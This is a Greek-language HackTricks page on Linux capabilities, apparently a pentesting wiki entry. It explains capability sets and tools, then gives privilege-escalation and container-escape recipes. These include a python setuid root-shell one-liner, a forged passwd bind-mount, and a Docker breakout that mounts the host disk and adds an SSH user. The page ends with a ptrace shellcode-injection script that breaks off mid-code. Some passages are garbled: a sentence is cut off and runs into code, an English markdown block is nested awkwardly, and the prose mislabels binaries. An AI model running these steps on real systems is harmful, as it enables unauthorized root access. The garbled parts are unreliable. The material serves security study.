# Ικανότητες Linux

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) είναι το πιο σχετικό συνέδριο κυβερνοασφάλειας στην **Ισπανία** και ένα από τα πιο σημαντικά στην **Ευρώπη**. Με **αποστολή την προώθηση της τεχνικής γνώσης**, αυτό το συνέδριο είναι ένας ζωηρός σημείο συνάντησης για επαγγελματίες τεχνολογίας και κυβερνοασφάλειας σε κάθε ειδικότητα.\\

{% embed url="https://www.rootedcon.com/" %}

## Ικανότητες Linux

Οι ικανότητες του Linux διαιρούν τα **δικαιώματα του root σε μικρότερες, διακριτές μονάδες**, επιτρέποντας στις διεργασίες να έχουν ένα υποσύνολο των δικαιωμάτων. Αυτό μειώνει τους κινδύνους μην παρέχοντας πλήρη δικαιώματα root χωρίς λόγο.

### Το πρόβλημα:
- Οι κανονικοί χρήστες έχουν περιορισμένες άδειες, επηρεάζοντας εργασίες όπως η ανοίγματος ενός δικτυακού socket που απαιτεί πρόσβαση root.

### Σύνολα ικανοτήτων:

1. **Κληρονομημένες (CapInh)**:
- **Σκοπός**: Καθορίζει τις ικανότητες που κληρονομούνται από τη γονική διεργασία.
- **Λειτουργικότητα**: Όταν δημιουργείται μια νέα διεργασία, κληρονομεί τις ικανότητες από τη γονική της διεργασία σε αυτό το σύνολο. Χρήσιμο για τη διατήρηση ορισμένων δικαιωμάτων σε όλες τις διεργασίες.
- **Περιορισμοί**: Μια διεργασία δεν μπορεί να αποκτήσει ικανότητες που η γονική της διεργασία δεν είχε.

2. **Ενεργές (CapEff)**:
- **Σκοπός**: Αντιπροσωπεύει τις πραγματικές ικανότητες που μια διεργασία χρησιμοποιεί σε κάθε στιγμή.
- **Λειτουργικότητα**: Είναι το σύνολο των ικανοτήτων που ελέγχονται από τον πυρήνα για να χορηγήσει άδεια για διάφορες λειτουργίες. Για αρχεία, αυτό το σύνολο μπορεί να είναι ένα σημαία που υποδεικνύει εάν οι επιτρεπόμενες ικανότητες του αρχείου θα θεωρηθούν ενεργές.
- **Σημασία**: Το ενεργό σύνολο είναι κρίσιμο για άμεσους ελέγχους δικαιωμάτων, λειτουργώντας ως το ενεργό σύνολο ικανοτήτων που μια διεργασία μπορεί να χρησιμοποιήσει.

3. **Επιτρεπόμενες (CapPrm)**:
- **Σκοπός**: Καθορίζει το μέγιστο σύνολο ικανοτήτων που μια διεργασία μπορεί να έχει.
- **Λειτουργικότητα**: Μια διεργασία μπορεί να αναβαθμίσει μια ικανότητα από το σύνολο των επιτρεπόμενων στο ενεργό της σύνολο, δίνοντάς της τη δυνατότητα να χρησιμοποιήσει αυτήν την ικανότητα. Μπορεί επίσης να απορρίψει ικανότητες από το σύνολο των επιτρεπόμενων.
- **Όριο**: Λειτουργεί ως άνω όριο για τις ικανότητες που μια διεργασία μπορεί να έχει, εξασφαλίζοντας ότι μια διεργασία δεν υπερβαίνει το προκαθορισμένο πεδίο δικαιωμάτων της.

4. **Οριοθέτηση (CapBnd)**:
- **Σκοπός**: Τίθεται ένα όριο στις ικανότητες που μια διεργασία μπορεί ποτέ να αποκτήσει κατά τη διάρκεια του κύκλου ζωής της.
- **Λειτουργικότητα**: Ακόμη κι αν μια διεργασ
```python
# Code to demonstrate the interaction of different capability sets might look like this:
# Note: This is pseudo-code for illustrative purposes only.
def manage_capabilities(process):
if process.has_capability('cap_setpcap'):
process.add_capability_to_set('CapPrm', 'new_capability')
process.limit_capabilities('CapBnd')
process.preserve_capabilities_across_execve('CapAmb')
```
Για περισσότερες πληροφορίες, ελέγξτε:

* [https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
* [https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)

## Δυνατότητες Διεργασιών και Εκτελέσιμων Αρχείων

### Δυνατότητες Διεργασιών

Για να δείτε τις δυνατότητες για μια συγκεκριμένη διεργασία, χρησιμοποιήστε το αρχείο **status** στον κατάλογο /proc. Καθώς παρέχει περισσότερες λεπτομέρειες, ας περιορίσουμε τις πληροφορίες μόνο σχετικά με τις δυνατότητες του Linux.\
Σημειώστε ότι για όλες τις εκτελούμενες διεργασίες, οι πληροφορίες δυνατοτήτων διατηρούνται ανά νήμα, ενώ για τα εκτελέσιμα αρχεία στο σύστημα αρχείων αποθηκεύονται σε επεκταμένα χαρακτηριστικά.

Μπορείτε να βρείτε τις δυνατότητες που έχουν καθοριστεί στο αρχείο /usr/include/linux/capability.h

Μπορείτε να βρείτε τις δυνατότητες της τρέχουσας διεργασίας με την εντολή `cat /proc/self/status` ή με την εντολή `capsh --print` και των άλλων χρηστών στο `/proc/<pid>/status`
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
Αυτή η εντολή θα πρέπει να επιστρέψει 5 γραμμές σε περισσότερα συστήματα.

* CapInh = Κληρονομημένες δυνατότητες
* CapPrm = Επιτρεπόμενες δυνατότητες
* CapEff = Αποτελεσματικές δυνατότητες
* CapBnd = Σύνολο περιορισμού
* CapAmb = Σύνολο περιβάλλοντος δυνατοτήτων
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
Αυτοί οι δεκαεξαδικοί αριθμοί δεν έχουν νόημα. Χρησιμοποιώντας το εργαλείο capsh μπορούμε να τους αποκωδικοποιήσουμε σε ονόματα δυνατοτήτων.
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
Ας ελέγξουμε τώρα τις **δυνατότητες (capabilities)** που χρησιμοποιεί το `ping`:
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Αν και αυτό λειτουργεί, υπάρχει και ένας άλλος και πιο εύκολος τρόπος. Για να δείτε τις δυνατότητες ενός εκτελούμενου διεργασίας, απλά χρησιμοποιήστε το εργαλείο **getpcaps** ακολουθούμενο από το αναγνωριστικό διεργασίας (PID) της. Μπορείτε επίσης να παρέχετε μια λίστα από αναγνωριστικά διεργασίας.
```bash
getpcaps 1234
```
Ας ελέγξουμε εδώ τις δυνατότητες του `tcpdump` αφού έχουμε δώσει στο δυαδικό αρκετές δυνατότητες (`cap_net_admin` και `cap_net_raw`) για να καταγράφει το δίκτυο (_το tcpdump εκτελείται στη διεργασία 9562_):
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Όπως μπορείτε να δείτε, οι δυνατότητες που δίνονται αντιστοιχούν στα αποτελέσματα των 2 τρόπων ανάκτησης των δυνατοτήτων ενός δυαδικού αρχείου.\
Το εργαλείο _getpcaps_ χρησιμοποιεί τη συστημική κλήση **capget()** για να ελέγξει τις διαθέσιμες δυνατότητες για ένα συγκεκριμένο νήμα. Αυτή η συστημική κλήση χρειάζεται μόνο να παρέχει το PID για να λάβει περισσότερες πληροφορίες.

### Δυνατότητες Δυαδικών Αρχείων

Τα δυαδικά αρχεία μπορούν να έχουν δυνατότητες που μπορούν να χρησιμοποιηθούν κατά την εκτέλεσή τους. Για παράδειγμα, είναι πολύ συνηθισμένο να βρεθεί το δυαδικό αρχείο `ping` με τη δυνατότητα `cap_net_raw`:
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
Μπορείτε να **αναζητήσετε δυνατότητες σε δυαδικά αρχεία** χρησιμοποιώντας:
```bash
getcap -r / 2>/dev/null
```
### Απόρριψη δυνατοτήτων με το capsh

Εάν απορρίψουμε τις δυνατότητες CAP\_NET\_RAW για το _ping_, τότε η εργαλειοθήκη ping δεν θα λειτουργεί πλέον.
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
Εκτός από την ίδια την έξοδο της εντολής _capsh_, η ίδια η εντολή _tcpdump_ θα πρέπει επίσης να εμφανίσει ένα σφάλμα.

> /bin/bash: /usr/sbin/tcpdump: Η λειτουργία δεν επιτρέπεται

Το σφάλμα δείχνει ότι η εντολή ping δεν επιτρέπεται να ανοίξει ένα socket ICMP. Τώρα ξέρουμε με βεβαιότητα ότι αυτό λειτουργεί όπως αναμενόταν.

### Αφαίρεση Ικανοτήτων

Μπορείτε να αφαιρέσετε ικανότητες από ένα δυαδικό αρχείο με τη χρήση της εντολής
```bash
setcap -r </path/to/binary>
```
## Δυνατότητες Χρήστη

Φαίνεται **είναι δυνατόν να ανατεθούν δυνατότητες και σε χρήστες**. Αυτό πιθανώς σημαίνει ότι κάθε διεργασία που εκτελείται από τον χρήστη θα μπορεί να χρησιμοποιεί τις δυνατότητες του χρήστη.\
Βασισμένο σε [αυτό](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [αυτό](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html) και [αυτό](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user), πρέπει να διαμορφωθούν μερικά αρχεία για να δοθούν σε έναν χρήστη συγκεκριμένες δυνατότητες, αλλά το αρχείο που αναθέτει τις δυνατότητες σε κάθε χρήστη θα είναι το `/etc/security/capability.conf`.\
Παράδειγμα αρχείου:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## Ικανότητες Περιβάλλοντος

Με τη συγγραφή του παρακάτω προγράμματος, είναι δυνατόν να **εκκινήσετε ένα κέλυφος bash μέσα σε ένα περιβάλλον που παρέχει ικανότητες**.

{% code title="ambient.c" %}
```c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```
{% endcode %}
```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
Μέσα στο **bash που εκτελείται από το μεταγλωττισμένο δυναμικό δυνατοτήτων** είναι δυνατό να παρατηρηθούν οι **νέες δυνατότητες** (ένας κανονικός χρήστης δεν θα έχει καμία δυνατότητα στην ενότητα "current").
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
{% hint style="danger" %}
Μπορείτε **μόνο να προσθέσετε δυνατότητες που υπάρχουν** και στα επιτρεπόμενα και στα κληρονομούμενα σύνολα.
{% endhint %}

### Δυνατότητες ευαισθητοποίησης/αμόρφωτων δυνατοτήτων

Οι **ευαισθητοποιημένες δυνατότητες δεν θα χρησιμοποιήσουν τις νέες δυνατότητες** που δίνονται από το περιβάλλον, ενώ οι **αμόρφωτες δυνατότητες θα τις χρησιμοποιήσουν** καθώς δεν θα τις απορρίψουν. Αυτό καθιστά τις αμόρφωτες δυνατότητες ευάλωτες μέσα σε ένα ειδικό περιβάλλον που χορηγεί δυνατότητες σε δυαδικά αρχεία.

## Δυνατότητες υπηρεσίας

Από προεπιλογή, μια **υπηρεσία που εκτελείται ως root θα έχει ανατεθεί όλες τις δυνατότητες**, και σε ορισμένες περιπτώσεις αυτό μπορεί να είναι επικίνδυνο.\
Για τον λόγο αυτό, ένα αρχείο **διαμόρφωσης της υπηρεσίας** επιτρέπει να **καθορίσετε** τις **δυνατότητες** που θέλετε να έχει, **και** τον **χρήστη** που πρέπει να εκτελεί την υπηρεσία για να αποφευχθεί η εκτέλεση μιας υπηρεσίας με περιττά προνόμια:
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Δυνατότητες σε Εμπορεύματα Docker

Από προεπιλογή, το Docker αναθέτει μερικές δυνατότητες στα εμπορεύματα. Είναι πολύ εύκολο να ελέγξετε ποιες είναι αυτές οι δυνατότητες εκτελώντας:
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) είναι το πιο σχετικό συνέδριο κυβερνοασφάλειας στην **Ισπανία** και ένα από τα πιο σημαντικά στην **Ευρώπη**. Με **αποστολή να προωθήσει την τεχνική γνώση**, αυτό το συνέδριο είναι ένας ζωντανός συνάντησης για επαγγελματίες τεχνολογίας και κυβερνοασφάλειας σε κάθε ειδικότητα.

{% embed url="https://www.rootedcon.com/" %}

## Απόκτηση Προνομίων/Απόδραση από Εμποδίσματα Επιπέδου Χρήστη

Οι δυνατότητες είναι χρήσιμες όταν **θέλετε να περιορίσετε τις δικές σας διεργασίες μετά από προνομιούχες λειτουργίες** (π.χ. μετά την ρύθμιση του chroot και τη σύνδεση σε ένα socket). Ωστόσο, μπορούν να εκμεταλλευτούνται περνώντας τους κακόβουλες εντολές ή ορίζοντας κακόβουλα ορίσματα που εκτελούνται ως root.

Μπορείτε να επιβάλετε δυνατότητες σε προγράμματα χρησιμοποιώντας την εντολή `setcap` και να ελέγξετε αυτές χρησιμοποιώντας την εντολή `getcap`:
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
Το `+ep` σημαίνει ότι προσθέτετε τη δυνατότητα ("-" θα την αφαιρούσε) ως Αποτελεσματική και Επιτρεπόμενη.

Για να αναγνωρίσετε προγράμματα σε ένα σύστημα ή φάκελο με δυνατότητες:
```bash
getcap -r / 2>/dev/null
```
### Παράδειγμα εκμετάλλευσης

Στο παρακάτω παράδειγμα, το δυαδικό αρχείο `/usr/bin/python2.6` θεωρείται ευάλωτο για προνομιούχα ανόδο.
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**Δυνατότητες** που απαιτούνται από το `tcpdump` για να **επιτραπεί σε οποιονδήποτε χρήστη να καταγράφει πακέτα**:

```markdown
To allow any user to sniff packets, the `tcpdump` binary needs to have the following capabilities:

```html
CAP_NET_RAW
CAP_NET_ADMIN
```

These capabilities can be set using the `setcap` command:

```html
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
```

Alternatively, you can use the `getcap` command to check the current capabilities of the `tcpdump` binary:

```html
getcap /usr/sbin/tcpdump
```

If the capabilities are not set correctly, you can use the `setcap` command to add them:

```html
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
```

Remember to use caution when granting capabilities to binaries, as it can introduce security risks if not done properly.
```
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### Η ειδική περίπτωση των "άδειων" δυνατοτήτων

[Από τα έγγραφα](https://man7.org/linux/man-pages/man7/capabilities.7.html): Σημειώστε ότι μπορείτε να αναθέσετε άδεια σύνολα δυνατοτήτων σε ένα αρχείο προγράμματος και, ως εκ τούτου, είναι δυνατόν να δημιουργήσετε ένα πρόγραμμα set-user-ID-root που αλλάζει το αποτελεσματικό και το αποθηκευμένο set-user-ID της διεργασίας που εκτελεί το πρόγραμμα σε 0, αλλά δεν παρέχει καμία δυνατότητα σε αυτήν τη διεργασία. Ή, απλά, αν έχετε ένα δυαδικό αρχείο που:

1. δεν ανήκει στον ριζικό χρήστη
2. δεν έχει οριστεί το `SUID`/`SGID`
3. έχει άδειο σύνολο δυνατοτήτων (π.χ.: `getcap myelf` επιστρέφει `myelf =ep`)

τότε **αυτό το δυαδικό αρχείο θα εκτελεστεί ως ριζικός χρήστης**.

## CAP_SYS_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** είναι μια ισχυρή δυνατότητα του Linux, συχνά ισοδυναμούμενη με ένα επίπεδο root λόγω των εκτεταμένων **διοικητικών προνομίων** της, όπως η προσάρτηση συσκευών ή η επεξεργασία χαρακτηριστικών του πυρήνα. Ενώ είναι απαραίτητη για τα containers που προσομοιώνουν ολόκληρα συστήματα, η **`CAP_SYS_ADMIN` προκαλεί σημαντικές προκλήσεις ασφαλείας**, ειδικά σε περιβάλλοντα με εφαρμογές σε containers, λόγω της δυνατότητάς της για ανέλιξη προνομίων και παραβίαση του συστήματος. Επομένως, η χρήση της απαιτεί αυστηρές αξιολογήσεις ασφαλείας και προσεκτική διαχείριση, με έμφαση στην απόρριψη αυτής της δυνατότητας σε εφαρμογές που τρέχουν σε συγκεκριμένα containers, για να τηρηθεί η αρχή του ελάχιστου προνομίου και να ελαχιστοποιηθεί η επιθετική επιφάνεια. 

**Παράδειγμα με δυαδικό αρχείο**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
Χρησιμοποιώντας τη γλώσσα προγραμματισμού Python μπορείτε να τοποθετήσετε έναν τροποποιημένο αρχείο _passwd_ πάνω από το πραγματικό _passwd_ αρχείο:
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
Και τέλος **προσαρτήστε** το τροποποιημένο αρχείο `passwd` στο `/etc/passwd`:
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
Και θα μπορείτε να **`su` ως root** χρησιμοποιώντας τον κωδικό πρόσβασης "password".

**Παράδειγμα με περιβάλλον (Docker breakout)**

Μπορείτε να ελέγξετε τις ενεργοποιημένες δυνατότητες μέσα στον docker container χρησιμοποιώντας:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Μέσα στην προηγούμενη έξοδο μπορείτε να δείτε ότι η δυνατότητα SYS_ADMIN είναι ενεργοποιημένη.

* **Προσάρτηση (Mount)**

Αυτό επιτρέπει στον docker container να προσαρτήσει το δίσκο του κεντρικού συστήματος και να έχει ελεύθερη πρόσβαση σε αυτόν:
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
* **Πλήρης πρόσβαση**

Στην προηγούμενη μέθοδο καταφέραμε να αποκτήσουμε πρόσβαση στον δίσκο του docker host.\
Στην περίπτωση που ανακαλύψετε ότι ο host εκτελεί έναν διακομιστή **ssh**, μπορείτε να **δημιουργήσετε έναν χρήστη μέσα στον δίσκο του docker host** και να αποκτήσετε πρόσβαση μέσω SSH:
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP\_SYS\_PTRACE

**Αυτό σημαίνει ότι μπορείτε να δραπετεύσετε από τον container εισάγοντας ένα shellcode μέσα σε κάποια διεργασία που εκτελείται μέσα στον host.** Για να έχετε πρόσβαση στις διεργασίες που εκτελούνται μέσα στον host, ο container πρέπει να εκτελεστεί τουλάχιστον με την επιλογή **`--pid=host`**.

Το **[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** παρέχει τη δυνατότητα χρήσης λειτουργιών αποσφαλμάτωσης και ανίχνευσης κλήσεων συστήματος που παρέχονται από τις `ptrace(2)` και τις κλήσεις cross-memory attach όπως οι `process_vm_readv(2)` και `process_vm_writev(2)`. Παρόλο που είναι ισχυρό για διαγνωστικούς και παρακολούθησης σκοπούς, αν το `CAP_SYS_PTRACE` είναι ενεργοποιημένο χωρίς περιοριστικά μέτρα όπως ένα φίλτρο seccomp στην `ptrace(2)`, μπορεί να υπονομεύσει σημαντικά την ασφάλεια του συστήματος. Συγκεκριμένα, μπορεί να εκμεταλλευτείται για να παρακάμψει άλλους περιορισμούς ασφαλείας, ιδίως αυτούς που επιβάλλονται από το seccomp, όπως αποδεικνύουν [αποδείξεις (PoC) όπως αυτή](https://gist.github.com/thejh/8346f47e359adecd1d53).

**Παράδειγμα με δυαδικό αρχείο (python)**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
